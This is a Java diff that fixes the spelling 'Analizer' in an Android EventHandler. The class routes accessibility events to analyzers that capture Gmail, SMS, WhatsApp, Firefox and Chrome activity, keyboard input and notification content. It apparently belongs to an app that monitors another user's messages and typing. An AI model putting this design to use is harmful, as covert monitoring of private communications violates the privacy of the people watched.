@@ -39,38 +39,38 @@ public class EventHandler {
     private String currentPackage;
 
     /**
-     * General communication analizers
+     * General communication analyzers
      */
-    private GmailAnalyzerImpl gmailAnalizer;
-    private SmsAnalyzerImpl smsAnalizer;
+    private GmailAnalyzerImpl gmailAnalyzer;
+    private SmsAnalyzerImpl smsAnalyzer;
 
     /**
-     * Instant messaging analizers
+     * Instant messaging analyzers
      */
-    private WhatsappAnalyzerImpl whatsappAnalizer;
+    private WhatsappAnalyzerImpl whatsappAnalyzer;
 
     /**
-     * Web browsing analizers
+     * Web browsing analyzers
      */
-    private FirefoxAnalyzerImpl firefoxAnalizer;
-    private ChromeAnalyzerImpl chromeAnalizer;
+    private FirefoxAnalyzerImpl firefoxAnalyzer;
+    private ChromeAnalyzerImpl chromeAnalyzer;
 
     /**
-     * System events analizers
+     * System events analyzers
      */
-    private NotificationAnalyzerImpl notificationAnalizer;
+    private NotificationAnalyzerImpl notificationAnalyzer;
 
 
     public EventHandler(Context context) {
         this.context = context;
         currentPackage = "";
 
-        whatsappAnalizer = new WhatsappAnalyzerImpl(context);
-        gmailAnalizer = new GmailAnalyzerImpl(context);
-        smsAnalizer = new SmsAnalyzerImpl(context);
-        firefoxAnalizer = new FirefoxAnalyzerImpl(context);
-        chromeAnalizer = new ChromeAnalyzerImpl(context);
-        notificationAnalizer = new NotificationAnalyzerImpl(context);
+        whatsappAnalyzer = new WhatsappAnalyzerImpl(context);
+        gmailAnalyzer = new GmailAnalyzerImpl(context);
+        smsAnalyzer = new SmsAnalyzerImpl(context);
+        firefoxAnalyzer = new FirefoxAnalyzerImpl(context);
+        chromeAnalyzer = new ChromeAnalyzerImpl(context);
+        notificationAnalyzer = new NotificationAnalyzerImpl(context);
     }
 
     public void handleEvent(AccessibilityEvent event, Date timestamp) {
@@ -79,7 +79,7 @@ public class EventHandler {
                 event.getPackageName().toString(),
                 event.getClassName().toString());
 
-        //  commitAnalizerData(eventSto);
+        //  commitAnalyzerData(eventSto);
 
         //  this.checkSource(event.getSource());
 
@@ -96,23 +96,23 @@ public class EventHandler {
 
             // Communication cases
             case Strings.PACKAGE_GMAIL:
-                gmailAnalizer.compute(eventSto);
+                gmailAnalyzer.compute(eventSto);
                 break;
             case Strings.PACKAGE_SMS:
-                smsAnalizer.compute(eventSto);
+                smsAnalyzer.compute(eventSto);
                 break;
 
             // Instant messaging cases
             case Strings.PACKAGE_WHATSAPP:
-                whatsappAnalizer.compute(eventSto);
+                whatsappAnalyzer.compute(eventSto);
                 break;
 
             // Web browsing cases
             case Strings.PACKAGE_FIREFOX:
-                firefoxAnalizer.compute(eventSto);
+                firefoxAnalyzer.compute(eventSto);
                 break;
             case Strings.PACKAGE_CHROME:
-                chromeAnalizer.compute(eventSto);
+                chromeAnalyzer.compute(eventSto);
                 break;
 
             // Generals cases
@@ -129,7 +129,7 @@ public class EventHandler {
 
         switch (eventSto.getClassName()) {
             case Strings.CLASS_NOTIFICATION: // Android notification
-                notificationAnalizer.compute(eventSto);
+                notificationAnalyzer.compute(eventSto);
                 getMessagingSender(eventSto);
                 break;
             default:
@@ -159,7 +159,7 @@ public class EventHandler {
     private void handleShowKeyboard(EventSto eventSto) {
         switch (this.currentPackage) {
             case Strings.PACKAGE_WHATSAPP:
-                whatsappAnalizer.confirmKeyboardInput(eventSto.getCaptureInstant());
+                whatsappAnalyzer.confirmKeyboardInput(eventSto.getCaptureInstant());
                 break;
             default:
                 break;
@@ -174,7 +174,7 @@ public class EventHandler {
     private void handleHideKeyboard(EventSto eventSto) {
         switch (this.currentPackage) {
             case Strings.PACKAGE_FIREFOX:
-                firefoxAnalizer.confirmKeyboardInput(eventSto.getCaptureInstant());
+                firefoxAnalyzer.confirmKeyboardInput(eventSto.getCaptureInstant());
             default:
                 break;
         }
@@ -189,7 +189,7 @@ public class EventHandler {
 
         switch (Helper.getEventText(eventSto.getEvent())) {
             case Strings.KEY_WHATSAPP:
-                whatsappAnalizer.compute(eventSto);
+                whatsappAnalyzer.compute(eventSto);
                 break;
             default:
                 break;
@@ -202,12 +202,12 @@ public class EventHandler {
      *
      * @param eventSto the EventSto.
      */
-    private void commitAnalizerData(EventSto eventSto) {
+    private void commitAnalyzerData(EventSto eventSto) {
         if (!eventSto.getPackageName().equals(Strings.PACKAGE_KEYBOARD)
                 && !eventSto.getPackageName().equals(this.currentPackage)) {
             switch (this.currentPackage) {
                 case Strings.PACKAGE_WHATSAPP:
-                    whatsappAnalizer.checkRemainingData(eventSto);
+                    whatsappAnalyzer.checkRemainingData(eventSto);
                     break;
                 default:
                     break;
@@ -224,8 +224,8 @@ public class EventHandler {
     private void getMessagingSender(EventSto eventSto) {
         switch (eventSto.getPackageName()) {
             case Strings.PACKAGE_WHATSAPP:
-                whatsappAnalizer.setCurrentInterlocutor(
-                        notificationAnalizer.getNotificationContent(eventSto));
+                whatsappAnalyzer.setCurrentInterlocutor(
+                        notificationAnalyzer.getNotificationContent(eventSto));
                 break;
             default:
                 break;
